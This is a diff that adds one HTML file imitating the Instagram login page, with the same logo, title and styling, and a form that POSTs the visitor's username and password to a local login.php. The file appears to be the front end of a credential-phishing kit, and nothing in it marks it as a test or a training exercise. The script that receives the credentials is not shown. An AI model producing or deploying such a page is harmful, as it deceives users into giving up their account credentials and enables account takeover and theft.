@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Instagram</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: #fafafa;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 350px;
+      margin: 60px auto;
+      background-color: white;
+      border: 1px solid #dbdbdb;
+      padding: 40px 30px;
+      text-align: center;
+    }
+
+    .logo {
+      width: 180px;
+      margin-bottom: 25px;
+    }
+
+    input {
+      width: 100%;
+      padding: 10px;
+      margin: 6px 0;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+      background: #fafafa;
+    }
+
+    button {
+      width: 100%;
+      padding: 10px;
+      margin-top: 10px;
+      background-color: #3897f0;
+      border: none;
+      color: white;
+      font-weight: bold;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+
+    .footer {
+      margin-top: 20px;
+      font-size: 14px;
+    }
+
+    a {
+      text-decoration: none;
+      color: #385185;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img src="https://i.imgur.com/zqpwkLQ.png" alt="Instagram" class="logo">
+    <form method="POST" action="login.php">
+      <input type="text" name="username" placeholder="Phone number, username, or email" required><br>
+      <input type="password" name="password" placeholder="Password" required><br>
+      <button type="submit">Log In</button>
+    </form>
+    <div class="footer">
+      <p>Forgot your login details? <a href="#">Get help signing in.</a></p>
+    </div>
+  </div>
+</body>
+</html>
